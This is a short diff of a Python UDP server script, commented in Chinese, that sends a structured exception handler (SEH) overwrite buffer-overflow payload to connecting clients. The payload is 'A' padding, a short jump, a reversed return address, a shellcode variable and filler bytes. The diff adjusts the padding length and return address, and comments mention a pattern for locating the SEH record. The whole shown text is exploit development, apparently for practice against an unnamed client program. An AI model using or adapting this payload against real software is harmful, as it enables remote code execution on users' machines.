@@ -27,15 +27,15 @@ class MyUDPHandler(socketserver.BaseRequestHandler):
 
         # 用来定位 SEH 结构
         # data = b""
-        # for i in range(100):
+        # for i in range(150):
         #     data += bytes([ord("A") + i // 10])
         # print(data)
 
         # ShellCode 发送
-        # socket.sendto(data, self.client_address)
-        # socket.sendto(b"A" * 72 + b"\xeb\x06\x90\x90" + b"\x00\x40\x12\x70"[::-1] + shellcode, self.client_address)
-        socket.sendto(b"A" * 72 + b"\xeb\x06\x90\x90" + b"\x00\x40\x92\xbb"[::-1] + shellcode,
+        socket.sendto(b"A" * 80 + b"\xeb\x06\x90\x90" + b"\x00\x40\x17\x9f"[::-1] + shellcode + b"B" * 100,
                       self.client_address)
+        # socket.sendto(data, self.client_address)
+        # socket.sendto(b"A" * 72 + b"\xeb\x06\x90\x90" + b"\x41\x40\x12\x70"[::-1] + shellcode, self.client_address)
         # socket.sendto(data.upper(), self.client_address)
 
         # 用于进行堆栈溢出
